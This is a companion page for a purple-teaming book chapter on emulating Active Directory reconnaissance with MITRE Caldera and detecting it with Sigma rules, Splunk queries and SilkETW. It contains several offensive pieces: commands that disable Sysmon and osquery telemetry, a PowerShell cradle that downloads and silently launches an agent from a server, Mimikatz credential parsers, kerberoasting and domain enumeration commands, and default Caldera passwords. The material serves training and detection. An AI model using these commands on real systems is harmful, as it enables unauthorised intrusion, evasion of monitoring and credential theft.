---
layout: default
title: Active Directory Recon with MITRE Caldera
tags: []
header_type       : "hero"
include_on_search : true
show_tags         : true
---

<div class="bs-component">
    <div class="progress">
        <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: 75%; background-color:#eb34e1"></div>
    </div>
</div>

## Introduction

In the second of the emulation chapters in the book, we explore the steps an adversary might take to enumerate the configuration of the environment, and high-value Active Directory users and hosts. In this chapter we use the second of our offensive tools, MITRE Caldera.

<hr>

## Chapter Content

This section provides reproductions of the key figures and code snippets seen in this chapter.

#### The Caldera Emulation Framework

##### Deploying Caldera

These commands stop and disable Sysmon and osquery on the Linux host to prevent unwanted telemetry being logged to Splunk.

```sh
ubuntu@ar-linux:~$ sudo systemctl stop sysmon
ubuntu@ar-linux:~$ sudo systemctl disable sysmon
ubuntu@ar-linux:~$ sudo systemctl stop osqueryd
ubuntu@ar-linux:~$ sudo systemctl disable osqueryd
```

Commands to clone the Caldera repository into `/opt`.

```sh
ubuntu@ar-linux:~$ cd /opt
ubuntu@ar-linux:/opt$ sudo git clone https://github.com/aguidetopurpleteaming/caldera.git --recursive
```

Commands to install Docker and build the Caldera container.

```sh
ubuntu@ar-linux:/opt$ cd /opt/caldera
ubuntu@ar-linux:/opt/caldera$ sudo apt update
ubuntu@ar-linux:/opt/caldera$ sudo apt install -y docker.io
ubuntu@ar-linux:/opt/caldera$ sudo docker build --build-arg WIN_BUILD=true . -t caldera:server
```

Command to launch the Caldera container and 'detach' to leave it running as a background process.

```sh
ubuntu@ar-linux:/opt/caldera$ sudo docker run -d --name=caldera -p 7010:7010 -p 7011:7011/udp -p 7012:7012 -p 8888:8888 caldera:server
```

Commands to spawn an interactive shell in the Caldera container and read the 'red' user default password.

```sh
ubuntu@ar-linux:/opt/caldera$ sudo docker exec -it caldera /bin/bash
root@e1a9473f9ca6:/usr/src/app# cat conf/local.yml

--snip--
users:
  blue:
    blue: z9yB8XthMOgaDiTChu7yXZ4sAdnJfJXwo9a_wo67hpY
  red:
    red: TxdlgzoC-0ZxnDTFYlUO_7UM3eEB1TecjYt3F43s2UY
```

##### Remotely Connecting to Endpoints

The PowerShell script used to connect hosts to the Caldera server by downloading and launching a Sandcat agent.

```powershell
$server="http://10.0.1.21:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
get-process | ? {$_.modules.filename -like "C:\Users\Public\agpt.exe"} | stop-process -f;
rm -force "C:\Users\Public\agpt.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\agpt.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\agpt.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
```

##### Selecting Abilities

The YAML definition of the <i>Identify active user</i> ability:

```yaml
---

- id: c0da588f-79f0-4263-8998-7496b1a40596
  name: Identify active user
  description: Find user running agent
  tactic: discovery
  technique:
    attack_id: T1033
    name: System Owner/User Discovery
  platforms:
    darwin:
      sh:
        command: whoami
        parsers:
          plugins.stockpile.app.parsers.basic:
            - source: host.user.name
            - source: domain.user.name
    linux:
      sh:
        command: whoami
        parsers:
          plugins.stockpile.app.parsers.basic:
            - source: host.user.name
            - source: domain.user.name
    windows:
      psh:
        command: |
          $env:username
        parsers:
          plugins.stockpile.app.parsers.basic:
            - source: host.user.name
            - source: domain.user.name
      cmd:
        command: echo %username%
        parsers:
          plugins.stockpile.app.parsers.basic:
            - source: host.user.name
            - source: domain.user.name
```

##### Working with Facts

A YAML definition for the ability to identify processes run by the users of a Linux host.

```yaml
---

- id: 3b5db901-2cb8-4df7-8043-c4628a6a5d5a
  name: Find user processes
  description: Get process info for processes running as a user
  tactic: discovery
  technique:
    attack_id: T1057
    name: Process Discovery
  platforms:
    linux:
      sh:
        command: |
          ps aux | grep #{host.user.name}
    --snip--
  requirements:
    - plugins.stockpile.app.requirements.paw_provenance:
      - source: host.user.name
```

A snippet of the parser definitions for extracting users, passwords and NTHashes for users from Mimikatz output.

```yaml
parsers:
  plugins.stockpile.app.parsers.katz:
  - source: domain.user.name
    edge: has_password
    target: domain.user.password
  - source: domain.user.name
    edge: has_hash
    target: domain.user.ntlm
  - source: domain.user.name
    edge: has_hash
    target: domain.user.sha1
```

An <i>Impersonate User</i> ability that leverages the `paw_provenance` plugin to match user credential facts to the current host.

```yaml
---

- id: 3796a00b-b11d-4731-b4ca-275a07d83299
  name: Impersonate user
  description: Run an application as a different user
  tactic: execution
  technique:
    attack_id: T1059.001
    name: "Command and Scripting Interpreter: PowerShell"
  platforms:
    windows:
      psh:
        command: |
          $job = Start-Job -ScriptBlock {
            $username = '#{host.user.name}';
            $password = '#{host.user.password}';
            $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
            $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
            Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;
          };
          Receive-Job -Job $job -Wait;
  requirements:
    - plugins.stockpile.app.requirements.paw_provenance:
      - source: host.user.name
    - plugins.stockpile.app.requirements.basic:
      - source: host.user.name
        edge: has_password
        target: host.user.password
```

#### Logging

<div class="bs-component">
    <div class="alert alert-warning">
        You can download <code>calderaToAttire</code> from: <a target="_blank" href="https://github.com/improsec/calderaToAttire">https://github.com/improsec/calderaToAttire</a>
    </div>
</div>

Command to convert an exported Caldera report output to ATTiRe format using `calderaToAttire`.

```sh
ubuntu@agpt:/Tools/calderaToAttire$ python CalderaToAttire.py Enumerator_report.json
```

#### Simulating Active Directory Enumeration

Commands used in the creation of abilities for Active Directory reconnaissance.

```sh
nltest /domain_trusts /all_trusts
nltest /dclist:%USERDOMAIN%
net group "Domain Admins" /domain
```

Additional commands leveraging PowerShell and the PowerView script.

```powershell
Import-Module .\PowerView.ps1 -Force; 
Get-DomainComputer -OperatingSystem *server* -Properties dnshostname

Import-Module .\PowerView.ps1 -Force; 
Get-DomainUser -SPN 
```

#### Defending Against the Attack

##### Command Line Arguments

A sigma rule for detection of `nltest` usage.

| Sourced from: <a target="_blank" href="https://github.com/SigmaHQ/sigma/blob/fad4742996c55d8d4663e611f84877a2b741dc46/rules/windows/process_creation/proc_creation_win_net_groups_and_accounts_recon.yml">https://github.com/SigmaHQ/sigma/blob/fad4742996c55d8d4663e611f84877a2b741dc46/rules/windows/process_creation/proc_creation_win_net_groups_and_accounts_recon.yml</a>

```yaml
title: Potential Recon Activity Via Nltest.EXE
id: 5cc90652-4cbd-4241-aa3b-4b462fa5a248
related:
    - id: 410ad193-a728-4107-bc79-4419789fcbf8
      type: similar
    - id: 903076ff-f442-475a-b667-4f246bcc203b
      type: similar
    - id: 77815820-246c-47b8-9741-e0def3f57308
      type: obsolete
status: test
description: Detects nltest commands that can be used for information discovery
references:
    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)
    - https://thedfirreport.com/2021/08/16/trickbot-leads-up-to-fake-1password-installation/
    - https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/
    - https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters
    - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/
    - https://eqllib.readthedocs.io/en/latest/analytics/03e231a6-74bc-467a-acb1-e5676b0fb55e.html
    - https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/
    - https://github.com/redcanaryco/atomic-red-team/blob/5360c9d9ffa3b25f6495f7a16e267b719eba2c37/atomics/T1482/T1482.md#atomic-test-2---windows---discover-domain-trusts-with-nltest
author: Craig Young, oscd.community, Georg Lauenstein
date: 2021-07-24
modified: 2023-12-15
tags:
    - attack.discovery
    - attack.t1016
    - attack.t1482
logsource:
    category: process_creation
    product: windows
detection:
    selection_nltest:
        - Image|endswith: '\nltest.exe'
        - OriginalFileName: 'nltestrk.exe'
    selection_recon:
        - CommandLine|contains|all:
              - 'server'
              - 'query'
        - CommandLine|contains:
              - '/user'
              - 'all_trusts' # Flag for /domain_trusts
              - 'dclist:'
              - 'dnsgetdc:'
              - 'domain_trusts'
              - 'dsgetdc:'
              - 'parentdomain'
              - 'trusted_domains'
    condition: all of selection_*
falsepositives:
    - Legitimate administration use but user and host must be investigated
level: medium
```

A Splunk SPL query produced from the above Sigma rule, transformed using pySigma.

```perl
EventID=1 
Image="*\\nltest.exe" OR OriginalFileName="nltestrk.exe"
(CommandLine="*server*" CommandLine="*query*") OR CommandLine IN ("*/user*", "*all_trusts*", "*dclist:*", "*dnsgetdc:*", "*domain_trusts*", "*dsgetdc:*", "*parentdomain*", "*trusted_domains*")
```

An equivalent query using process creation events with event ID 4688.

```perl
EventID=4688
NewProcessName=*\\nltest.exe
(CommandLine="*server*" CommandLine="*query*") OR CommandLine IN ("*/user*", "*all_trusts*", "*dclist:*", "*dnsgetdc:*", "*domain_trusts*", "*dsgetdc:*", "*parentdomain*", "*trusted_domains*")
```

##### Theshold-Based Alerting

A threshold-based Splunk SPL query, looking for more than two enumeration commands performed on the same host in the lookback window.

```perl
index=win
Channel="Microsoft-Windows-Sysmon/Operational"
EventID=1
(Image="*\\nltest.exe" AND CommandLine IN ("*/dclist*", "*/domain_trusts*")) OR (Image="*\\net*.exe" AND CommandLine="*Domain Admins*")
| stats dc(CommandLine) as distinct_commands by Computer
| where distinct_commands > 2
```

##### Suspicious LDAP Queries

###### Configuring SilkService

The SilkService XML configuration, set to fetch LDAP queries from the `Microsoft-Windows-LDAP-Client` provider.

```xml
<SilkServiceConfig>
  <ETWCollector>
    <Guid>6a1e76fd-792b-412f-91ea-4b365de07bae</Guid>
    <CollectorType>user</CollectorType>
    <ProviderName>Microsoft-Windows-LDAP-Client</ProviderName>
    <OutputType>eventlog</OutputType>
  </ETWCollector>
</SilkServiceConfig>
```

Commands to create and start the <i>SilkService</i> service.

```powershell
C:\Program Files\SilkService> sc create SilkService binPath= "C:\Program Files\SilkService\SilkService.exe" start= auto
C:\Program Files\SilkService> sc start SilkService
```

The command to open the LDAP query window using `dsquery`,

```sh
C:\Users\Administrator> rundll32 dsquery,OpenQueryWindow
```

An LDAP query to execute in the query window.

```perl
(samAccountName=Administrator)
```

###### Forwaring SilkService Events

The configuration for Splunk event forwarding created at `C:\Program Files\SplunkUniversalForwarder\etc\apps\silkservice_inputs_app\local\inputs.conf`.

```ini
[WinEventLog://SilkService-Log]
disabled = false
renderXml = false
index = etw
source = XmlWinEventLog:SilkService-Log
```

Commands to restart the `SplunkForwarder` service to load the above configuration.

```powershell
C:\Users\Administrator> sc stop SplunkForwarder
C:\Users\Administrator> sc start SplunkForwarder
```

A Splunk query to transform the SilkService logs and filter for the `Microsoft-Windows-LDAP-Client`.

```perl
index=etw 
| spath input=Message 
| rename XmlEventData.* as *
| search ProviderName="Microsoft-Windows-LDAP-Client"
```


###### Identifying Tool-Specific Queries

Splunk SPL query to identify usage of PowerView to find kerberoastable users via a specific LDAP search filter.

```perl
index=etw 
| spath input=Message 
| rename XmlEventData.* as *
| search ProviderName="Microsoft-Windows-LDAP-Client"
| search SearchFilter="(&(samAccountType=805306368)(servicePrincipalName=\*))"
```

A similar query for identifying discovery of Active Directory computers, again using PowerView.

```perl
index=etw 
| spath input=Message 
| rename XmlEventData.* as *
| search ProviderName="Microsoft-Windows-LDAP-Client"
| search SearchFilter= "(&(samAccountType=805306369)(operatingsystem=*server*))"
```


<hr>

## Resources

The following resources expand on topics covered in this chapter.
<br/>
<br/>


#### The Scenario
<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>The translated Conti playbook showing Active Directory reconnaissance using LOLBAS and PowerView</h6>
                <p><i>"Conti-Leaked-Playbook-TTPs," accessed May 27, 2024</i></p>
                <a target="_blank" href="https://github.com/DISREL/Conti-Leaked-Playbook-TTPs/blob/main/Conti-Leaked-Playbook-TTPs.pdf" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>

#### Selecting Abilities
<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>The YAML definition for the Identify active user ability provided by the Stockpile plugin</h6>
                <p><i>"c0da588f-79f0-4263-8998-7496b1a40596," accessed May 27, 2024</i></p>
                <a target="_blank" href="https://github.com/mitre/stockpile/blob/f45c06b39d0aa7bdde2f01830bfa5c06d2353923/data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Caldera has a feature-rich API that can be leveraged to automate the creation of abilities, adversaries and operations. This is an example of this end-to-end process</h6>
                <p><i>"pyCaldera," accessed November 3, 2024</i></p>
                <a target="_blank" href="https://github.com/ajpc500/pyCaldera/blob/main/notebook.ipynb" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>The Compass plugin for Caldera provides a built-in ATT&CK Navigator and enables adversary profiles to be converted into Navigator layers and, going the other way, enables Navigator layers to be converted into adversary profiles (where the abilities exist)</h6>
                <p><i>"Compass," GitHub, accessed November 2, 2024</i></p>
                <a target="_blank" href="https://github.com/mitre/compass" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>

#### Working with Facts
<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Fact parsers provided by the Stockpile plugin, including one for Mimikatz output</h6>
                <p><i>"parsers," accessed May 27, 2024</i></p>
                <a target="_blank" href="https://github.com/mitre/stockpile/tree/master/app/parsers" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>The YAML definition for the Impersonate user ability that makes use of relationships between facts to operationalize username and password combinations</h6>
                <p><i>"3796a00b-b11d-4731-b4ca-275a07d83299," accessed May 27, 2024</i></p>
                <a target="_blank" href="https://github.com/mitre/stockpile/blob/f45c06b39d0aa7bdde2f01830bfa5c06d2353923/data/abilities/execution/3796a00b-b11d-4731-b4ca-275a07d83299.yml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>

#### Obfuscating Execution
<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Base64 obfuscator provided by the Stockpile plugin, used to modify executed abilities</h6>
                <p><i>"base64_basic.py," accessed May 27, 2024</i></p>
                <a target="_blank" href="https://github.com/mitre/stockpile/blob/f45c06b39d0aa7bdde2f01830bfa5c06d2353923/app/obfuscators/base64_basic.py" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>

#### Command Line Arguments
<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A Sigma rule for detecting Active Directory reconnaissance using nltest</h6>
                <p><i>"process_creation/proc_creation_win_nltest_recon.yml," GitHub, accessed November 3, 2024</i></p>
                <a target="_blank" href="https://github.com/SigmaHQ/sigma/blob/9bbd096e47540d9cf0be7150278754ae5ece39ed/rules/windows/process_creation/proc_creation_win_nltest_recon.yml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>

#### Suspicious LDAP Queries
<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A section of the PowerView script that constructs the LDAP search filter for kerberoastable users</h6>
                <p><i>"PowerView.ps1," accessed November 3, 2024</i></p>
                <a target="_blank" href="https://github.com/PowerShellMafia/PowerSploit/blob/d943001a7defb5e0d1657085a77a0e78609be58f/Recon/PowerView.ps1#L5206-L5209" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A walkthrough by Riccardo Ancarani on use of SilkETW to detect suspicious LDAP queries with ETW telemetry</h6>
                <p><i>Riccardo Ancarani, "Hunting for Suspicious LDAP Activity with SilkETW and Yara," October 19, 2019</i></p>
                <a target="_blank" href="https://riccardoancarani.github.io/2019-10-19-hunting-for-domain-enumeration/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A snippet from the Rubeus code base that includes the construction of an LDAP search filter for the purposes of identifying kerberoastable users</h6>
                <p><i>"Roast.cs," accessed May 27, 2024</i></p>
                <a target="_blank" href="https://github.com/GhostPack/Rubeus/blob/b98d898217106decf5c06d13be9ffec2ff93c5e7/Rubeus/lib/Roast.cs#L457-L538" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A snippet from the GetUserSPNs.py script that includes a similar code section for constructing an LDAP search for kerberoastable users</h6>
                <p><i>"GetUsersSPNs.py," accessed May 27, 2024</i></p>
                <a target="_blank" href="https://github.com/fortra/impacket/blob/15eff8805116007cfb59332a64194a5b9c8bcf25/examples/GetUserSPNs.py#L297-L304" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A blog from Dom Chell on the red team perspective to Active Directory enumeration, including alternative sources of LDAP telemetry, defensive use cases and subsequent evasions</h6>
                <p><i>Dom Chell, "Active Directory Enumeration for Red Teams," MDSec, Feb, 2024</i></p>
                <a target="_blank" href="https://www.mdsec.co.uk/2024/02/active-directory-enumeration-for-red-teams/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>



<div class="container">
  <div class="row">
    <div class="col" style="text-align: left">
      <a href="/part-II/lotl-with-atomic-red-team/" class="btn btn-primary"><< Chapter 8</a>
    </div>
    <div class="col" style="text-align: right">
      <a href="/part-II/domain-compromise-with-mythic/" class="btn btn-primary">Chapter 10 >></a>
    </div>
  </div>
</div>